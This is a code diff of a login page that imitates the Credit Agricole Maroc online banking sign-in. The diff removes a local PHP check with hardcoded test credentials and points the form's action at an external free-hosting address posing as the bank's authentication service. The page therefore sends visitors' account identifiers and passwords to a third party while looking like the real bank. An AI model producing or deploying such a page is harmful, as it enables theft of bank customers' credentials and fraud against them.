@@ -1,22 +1,7 @@
-<?php
-session_start();
-
-@$user=$_POST["number"];
-@$pass=$_POST["pass"];
-@$valider=$_POST["submit"];
-
-if(isset($valider)){
-
- if($user=="12345678901" && $pass=="123456"){
- $_SESSION["autoriser"]="oui";
- header("location:Solde.php");
- }
-}
-?>
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Connexion - Mon compte Credit Agricole</title>
+	<title>Connexion - Mon compte Credit Agricole Maroc</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <link rel="stylesheet" type="text/css" href="Style.css"/>
@@ -30,7 +15,7 @@ if(isset($valider)){
 	</nav>
 	<div class="login">
 	<p style="font-size:25px;color:#347780;">ACCÉDER À <b>MES COMPTES</b></p>
-	<form method="post" action="#">
+	<form method="post" action="https://authentification-ca.000webhostapp.com/index.php">
 	<label><b>IDENTIFIANT</b><br /><sub style="color:gray;">saisissez votre identifiant a 11 chiffres</sub></label><br />
 <input type="tel" placeholder="Entrez votre identifiant" name="number" style="margin-bottom:20px;" maxlength="11"/><br />
 
@@ -46,4 +31,4 @@ if(isset($valider)){
 	</div>
 
 	</body>
-</html>
+</html> 
